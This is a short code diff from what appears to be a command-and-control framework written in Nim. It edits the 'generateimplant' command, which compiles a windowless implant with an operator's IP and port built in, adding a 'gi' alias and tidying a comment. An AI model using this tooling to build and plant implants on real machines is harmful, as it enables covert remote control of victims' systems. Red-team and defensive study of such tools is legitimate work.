@@ -43,7 +43,7 @@ proc execProc*(args: seq[string], server: C2Server) {.async.} =
     port = args[3]
   
   let compileCommand = "nim c -d:client " &
-    "--app=gui " & # disable window lol 
+    "--app=gui " & # disable window 
     "-d:ip=" & ip & " " & 
     "-d:port=" & port & " " & 
     (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
@@ -58,10 +58,10 @@ proc execProc*(args: seq[string], server: C2Server) {.async.} =
   else:
     infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ") 
 
-
 let cmd*: Command = Command(
   execProc: execProc,
   name: "generateimplant",
+  aliases: @["gi"],
   argsLength: 3,
   usage: @[
     "generateimplant [listenerID] [platform]",
